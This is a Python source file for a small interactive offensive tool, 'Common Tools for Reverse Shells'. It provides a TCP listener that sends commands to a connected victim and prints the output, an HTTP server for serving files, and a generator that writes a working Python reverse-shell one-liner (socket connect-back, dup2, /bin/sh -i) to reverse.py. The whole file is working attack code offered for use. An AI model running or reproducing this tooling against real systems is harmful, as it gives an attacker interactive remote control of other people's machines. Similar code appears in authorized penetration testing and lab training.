from cmd2 import Cmd
from colorama import Fore, Back, Style
import subprocess
import http.server
import socketserver
import socket
import time


class Shells(Cmd):
    intro = "Common Tools for Reverse Shells\n"
    prompt = "[" + Fore.YELLOW + "shells" + Style.RESET_ALL + "] >>> "

    def do_listen(self, line):
        "Start a listener by running 'listen PORT'"
        HOST = '0.0.0.0'
        PORT = int(line)

        server_socket = socket.socket(socket.AF_INET,
                                      socket.SOCK_STREAM)  # create TCP socket
        server_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR,
                                 1)  # prevent timeout
        server_socket.bind((HOST, PORT))
        server_socket.listen(5)  # max 5 connections

        client_socket, (
            client_ip,
            client_port) = server_socket.accept()  # accept connections

        while True:
            cmd = input("[rev-shell] > ")
            client_socket.send(cmd.encode())

            if (cmd == "quit"):
                break

            data = client_socket.recv(1024)
            print(data)

        client_socket.close()

    def do_webserver(self, line):
        "Start a python HTTP web server by running 'webserver PORT'"
        PORT = int(line)

        Handler = http.server.SimpleHTTPRequestHandler

        with socketserver.TCPServer(("", PORT), Handler) as httpd:
            print("Serving at port: " + str(PORT))
            httpd.serve_forever()

    def do_reverse(self, line):
        "Generates a reverse shell by running 'reverse <port>'"

        userIP = socket.gethostbyname(socket.gethostname())
        PORT = int(line)

        #this is the reverse script that gets written int othe file
        output = """python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"""" + userIP + """\",\"""" + str(PORT) + """\"));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'"""

        file = open("reverse.py", "w+")
        file.write(output)
        file.close()

        print("Script Generated !! \nRun function listen")


    # def do_exit(self, line):
    #     "Exits back to main menu"
    #     return True

    def do_back(self, line):
        "Returns back to previous prompt"
        return True

    # def do_EOF(self, line):
    #     "Exits the application"
    #     return True

    def postloop(self):
        "Exiting message"
        print("Exiting back to main menu...\n")

    def emptyline(self):
        "Does nothing on emptyline"
        pass


def shellExec():
    import sys
    sys.exit(Shells().cmdloop())
